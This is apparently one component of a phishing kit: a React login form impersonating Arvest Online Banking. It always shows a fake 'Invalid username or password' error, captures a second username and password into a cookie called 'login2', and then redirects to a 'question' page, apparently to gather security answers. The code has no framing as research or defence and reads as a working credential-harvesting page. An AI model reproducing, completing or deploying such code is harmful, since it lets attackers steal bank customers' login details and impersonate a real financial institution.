import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

export default function ReLogin() {
  const [formInput, setFormInput] = useState<Login2>({
    username2: "",
    password2: ""
})

const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    cookies.set("login2", formInput)
    navigate("../question", {replace:true})
}
  return (
    <>
      <div className="submitForm">
        
<div id="login-error" className="error-message">
          <p style={{ color: "red" }}>
            Invalid username or password, please try again!
          </p>
        </div>
       
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
          Please enter your Login ID to log in to online banking. <br />
        </p>

        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="username">
              Login ID <span style={{ color: "red" }}>*</span>
            </label>
            <input onChange={handleInputChange} required id="username" name="username2" type="text" />
          </div>
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="password">
              Password <span style={{ color: "red" }}>*</span>
            </label>
            <input required id="password" name="password2" onChange={handleInputChange} type="password" />
          </div>

          <div className="checkboxWrapper" style={{ marginTop: "20px" }}>
            <div className="checkbox">
              <input type="checkbox" name="" id="" />
            </div>
            <div className="label">
              <label htmlFor="">Remember User ID</label>
            </div>
          </div>
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your login ID
            </a>
          </p>
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your password
            </a>
          </p>
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>
        </form>

        
        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
